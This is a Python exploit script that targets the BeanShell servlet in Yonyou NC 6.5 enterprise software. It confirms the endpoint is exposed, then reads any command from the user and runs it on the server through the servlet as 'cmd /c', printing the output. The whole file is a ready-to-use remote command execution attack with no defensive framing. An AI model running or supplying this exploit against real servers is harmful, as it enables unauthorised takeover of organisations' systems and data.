# !/usr/bin/python3
# _*_ coding utf-8 _*_
# @Time     :2021/6/23 下午10:02
# @Auther   :LazyB0y
# @Title    :yonyou-beanshell-rce.py

import requests
import sys
from urllib.parse import quote
import re

def check(target_url):

    print("\033[1m[-]Detecting vulnerabilities!\n\033[0m")
    url = target_url + "/servlet/~ic/bsh.servlet.BshServlet"
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and "BeanShell" in response.text:
            print("\033[33m[+]The BeanShell page exists, and there may be vulnerabilities:{}\033[0m".format(url))
            return url
        else:
            print("\033[32mVulnerability does not exist\033[0m")
            sys.exit(0)
    except:
        print("Unable to connect to target")
        sys.exit(0)

def rce(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    command = str(input("\ncommand："))
    if command:
        data = "bsh.script=" + quote('exec("cmd /c {}");'.format(command))
        # print(data)
        try:
            response = requests.post(
                url=url, headers=headers, data=data
            )
            pattern = re.compile("<pre>(.*?)</pre>", re.S)
            result = re.search(pattern, response.text)
            print(result[0].replace('<pre>', '').replace('</pre>', ''))
        except:
            print("Command execution failed")
            sys.exit(0)
    else:
        sys.exit(0)


if __name__ == "__main__":
    msg = '''
            _                    ______  _____       
        | |                   | ___ \|  _  |      
        | |     __ _ _____   _| |_/ /| |/' |_   _ 
        | |    / _` |_  / | | | ___ \|  /| | | | |
        | |___| (_| |/ /| |_| | |_/ /\ |_/ / |_| |
        \_____/\__,_/___|\__, \____/  \___/ \__, |
                        __/ |              __/ |
                        |___/              |___/ 

                                
                                ---用友NC 6.5版本Beanshell命令执行
        '''
    print(msg)
    target_url = str(sys.argv[1])
    vulurl = check(target_url)
    rce(vulurl)